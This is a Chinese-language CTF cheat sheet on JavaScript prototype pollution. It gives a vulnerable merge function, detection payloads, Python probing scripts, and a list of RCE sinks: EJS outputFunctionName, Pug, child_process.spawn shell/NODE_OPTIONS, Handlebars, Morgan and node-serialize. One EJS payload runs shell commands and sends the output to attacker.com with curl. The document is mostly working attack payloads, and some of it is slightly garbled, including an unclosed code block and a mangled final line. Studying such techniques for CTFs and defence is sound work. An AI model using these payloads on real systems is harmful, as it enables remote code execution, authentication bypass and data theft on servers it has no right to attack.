# Prototype Pollution (原型链污染)

在 Node.js (JavaScript) 环境中，`Object.prototype` 是所有普通对象的基类。当程序不安全地将不可信的 JSON 键值对递归合并到现有对象中时，可能会导致**原型链污染**。这能修改所有新建对象的默认属性，从而绕过鉴权，甚至通过污染特定的模板引擎或子进程选项达成 **RCE**。

---

## 1. 污染源头 (Sources) 与检测

原型链污染通常源于不安全的**深拷贝 (Deep Copy)**、**对象合并 (Merge)** 或**路径赋值 (Path Setter)** 函数：

```javascript
// 典型的脆弱 merge 函数
function merge(target, source) {
    for (let key in source) {
        if (typeof target[key] === 'object' && typeof source[key] === 'object') {
            merge(target[key], source[key]); // 递归合并
        } else {
            target[key] = source[key];
        }
    }
}
```

### 探测 Payload
我们可以输入如下参数：
*   **JSON 格式**：
    ```json
    {
      "__proto__": {
        "polluted": "yes"
      }
    }
    ```
*   **对于禁止了 `__proto__` 键名但没有防范 `constructor` 的过滤器**：
    ```json
    {
      "constructor": {
        "prototype": {
          "polluted": "yes"
        }
      }
    }
    ```
*   **验证方法**：
    在控制台中新建一个普通空对象 `const obj = {};`。若 `obj.polluted === "yes"`，则证明污染成功。

---

## 2. 高价值利用链 (Exploit Sinks)

原型链污染成功后，需要找到被称为 **Sink** 的触发点才能将其转化为真正的危害。

### A. EJS 模板引擎注入 (RCE)
EJS 在渲染时，会读取配置对象中的 `outputFunctionName` 属性，如果不为 undefined，则使用 `eval` 动态生成渲染函数：

*   **漏洞 Sink 分析**：
    在 `ejs.js` 中有类似代码：`var fn = new Function(opts.localsName, ... ... + opts.outputFunctionName + ...)`。
*   **Payload 构造**：
    通过原型链污染设置 `outputFunctionName` 为恶意 JS 语句：
    ```json
    {
      "__proto__": {
        "outputFunctionName": "x; const exec = require('child_process').execSync; exec('curl http://attacker.com/' + exec('whoami')); //"
      }
    }
    ```
    当应用随后调用 `ejs.render(template, data)` 时，恶意代码在 eval 中执行，实现命令执行。

### B. Pug 模板引擎注入 (RCE)
Pug 也有类似的模板选项漏洞。Pug 编译函数时，如果选项中包含 `self`，它会通过加载某些特殊节点动态构建执行代码。

*   **Payload 构造**：
    ```json
    {
      "__proto__": {
        "self": true,
        "line": "console.log(global.process.mainModule.require('child_process').execSync('whoami').toString())"
      }
    }
    ```

### C. 子进程 `child_process.spawn` 污染 (RCE)
当后端调用 `child_process.spawn()` 或 `fork()`，但未指定 `shell`、`env` 等属性时，它会从 `Object.prototype` 中去获取这些选项。

*   **污染 `shell` 与 `argv`**：
    如果我们将 `shell` 污染为恶意的可执行文件路径，或者向其注入额外的环境变量，即可在后端派生子进程的瞬间劫持控制流：
    ```json
    {
      "__proto__": {
        "shell": "node",
        "argv0": "-e",
        "NODE_OPTIONS": "--require=/tmp/evil.js"
      }
    }
    ```

---

## 3. 防范与环境修复 (Clean-up)

在 CTF 漏洞验证完毕后，如果环境是长生命周期的应用（如常驻的 Node.js Web 服务），原型链污染修改的是运行时的全局基类。如果不及时清理，可能会导致后端崩溃，或者让其他队伍直接利用你的污染成果。

*   **手动复位**：
    污染成功后，使用 Python 或 Curl 发送复位 Payload 擦除属性：
    ```json
    {
      "__proto__": {
        "outputFunctionName": null,
        "polluted": null
      }
    }
    ```
---

## 4. Server-Side PP via Query Parser

```python
# qs (Node.js query string 库) 允许创建嵌套对象:
# GET /api/users?__proto__[isAdmin]=true
# 被 qs 解析为: {"__proto__": {"isAdmin": "true"}}

# 如果这个对象随后被 Object.assign 或 merge 到其他对象:
# → Object.prototype.isAdmin = "true"
# → 所有新对象继承 isAdmin = true
# → 鉴权绕过

def test_qs_pp(target: str):
    """测试 query string → prototype pollution"""
    probes = [
        "__proto__[polluted]=yes",
        "__proto__.polluted=yes",
        "constructor[prototype][polluted]=yes",
        "__proto__[isAdmin]=true",
        "__proto__[role]=admin",
    ]
    for probe in probes:
        r = requests.get(f"{target}?{probe}")
        r2 = requests.get(f"{target}/api/me")
        if "admin" in r2.text or r2.status_code != 401:
            print(f"[!] Potential PP via QS: {probe}")
```

---

## 5. 更多 Node.js Sinks

### Handlebars RCE

```json
{"__proto__": {"precompileOptions": {"knownHelpersOnly": false}}}
```

### Morgan (Logger) 注入

```json
{"__proto__": {"format": "':  require('child_process').execSync('id') //"}}
```

### Node-Serialize → RCE

```json
{"__proto__": {"type": "function", "body": "return require('child_process').execSync('id').toString()"}}
```

### MSR (Mini-Static-Resource) → RCE

```json
{"__proto__": {"root": "/", "path": "/flag"}}
```

---

## 6. Client-Side PP (DOM 污染)

```javascript
// 当客户端 JS 做 Object.assign 或 spread 时
// URL: https://target.com/#__proto__[isAdmin]=true
// JS 解析 hash 或 query params 后 merge → 污染 Object.prototype

// 检测: 在 Console 执行
console.log({}.isAdmin)  // 如果返回 true → 已被污染
```

---

## 7. PP 探测脚本

```python
# 自动检测 prototype pollution 入口
import requests

PP_PROBES = [
    # JSON
    ('json', {"__proto__": {"polluted": "yes"}}),
    ('json', {"constructor": {"prototype": {"polluted": "yes"}}}),
    ('json', {"__proto__": {"isAdmin": True}}),
    # Query string
    ('qs', "__proto__[polluted]=yes"),
    ('qs', "constructor[prototype][polluted]=yes"),
    # Form data
    ('form', {"__proto__[polluted]": "yes"}),
    ('form', {"constructor[prototype][polluted]": "yes"}),
]

def probe_pp(target_url: str, endpoints: list[str]):
    for ep in endpoints:
        for fmt, payload in PP_PROBES:
            if fmt == 'json':
                r = requests.post(target_url + ep, json=payload)
            elif fmt == 'qs':
                r = requests.get(target_url + ep + '?' + payload)
            else:
                r = requests.post(target_url + ep, data=payload)
            # 看是否有异常响应
            if r.status_code not in (400, 401, 403, 404):
                print(f"  [{fmt}] {ep}: {r.status_code}")
```

---

## 8. 攻击链

```
PP → EJS outputFunctionName → RCE
PP → Pug self+line → RCE  
PP → child_process.spawn shell → RCE
PP → Morgan format → 任意代码执行
PP → Handlebars knownHelpers → 模板注入 → RCE
PP via QS → Object.assign → isAdmin=true → 鉴权绕过
Client-Side PP → __proto__.isAdmin → 前端路由绕过
PP → bypass rate limit → 修改 limit 默认值 → 无限请求

## 9. Advanced PP (2024-2025)

### Constructor.prototype Bypass

```json
// 当 __proto__ 被 WAF 过滤:
{"constructor": {"prototype": {"isAdmin": true}}}
// Object.constructor.prototype.isAdmin = true → 所有对象继承

// 链: constructor.prototype.toString = null
// → 强制错误 → catch 块 eval config.debug.code
```

### React RSC Flight Protocol RCE (CVE-2025-55182)

```python
# React Server Components Flight protocol 反序列化
# 注入 __proto__ via Chunk → promise resolution hijack
# → require('child_process') → RCE

# PP payload for RSC stream:
RSC_PP_PAYLOAD = {
    "__proto__": {
        "then": "require('child_process').execSync('id')"
    }
}
```

### Class Pollution (devalue CVE-2025-57820)

```javascript
// 污染特定 class prototype → 而非全局 Object
// devalue library → 递归深拷贝时 constructor.prototype 被重写

{"constructor": {"prototype": {"isAdmin": true}}}
// → User 类的 prototype 被污染 → 所有 User 实例 isAdmin=true
```

### Post-Extraction PP

```python
# NODE_OPTIONS + shell 污染 → P大RCE（即使只能污染客户端对象）

# PP payload:
{"__proto__": {"shell": "node", "NODE_OPTIONS": "--require /tmp/evil.js"}}
# → child_process.spawn 继承 shell → node → 读 NODE_OPTIONS
# → require /tmp/evil.js → evil.js 执行 → RCE
```
```

